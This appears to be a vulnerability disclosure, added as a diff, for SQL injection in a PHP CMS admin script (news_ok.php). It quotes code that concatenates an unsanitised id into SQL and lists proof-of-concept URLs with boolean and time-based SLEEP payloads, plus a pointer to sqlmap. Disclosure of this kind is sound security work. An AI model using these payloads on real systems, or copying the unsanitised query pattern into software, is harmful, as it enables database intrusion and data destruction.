@@ -1,0 +1,53 @@
+affected source code file: /admin/news/news_ok.php
+--------------------------------
+affected source code:
+
+    <?php
+        require_once '../../inc/const.php';
+        $act = $_GET['act'];
+        $id =getvar('id');
+        .....
+        if ($act=='mod'){
+            $record = array(
+              'cid'	=>$cid,
+              'title'		=>$title,
+              'style'		=>$title_color,
+              'title_bold'=>$title_bold,
+              'title_em'	=>$title_em,
+              'title_u'	=>$title_u,
+              'picture'	=>$pic,		
+              'rank'		=>$rank,
+              'iscommend'	=>$iscommend,
+              'ispicture'	=>$ispicture,
+              'dateline'	=>date("y-m-d H-i-s"),
+              'content'	=>$content
+            );
+            $db->update($GLOBALS[databasePrefix].'content',$record,'id='.$id);
+            echo "<script>alert('修改成功!');window.location='news_manage.php';</script>";
+          }
+
+          //删除
+          if ($act=='del') {
+            //del_file($id);
+            $db->delete($GLOBALS[databasePrefix].'content',"id=".$id);
+            echo "<script>alert('删除成功!');window.location='news_manage.php';</script>";
+          }
+
+      ?>
+     
+
+--------------------------------
+affected reason:
+      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/news_ok.php
+--------------------------------
+affected executable: 
+  After Signing in to the background in advance. Then we can use burpsuit to grab the following URL packets: 
+  
+  Like this: 
+             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2'
+             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 and 1=1
+             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 and 1=2
+             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 RLIKE SLEEP(2)
+             
+  And we can see the sql injection problems.
+  Then, we can use tools like sqlmap for more information.
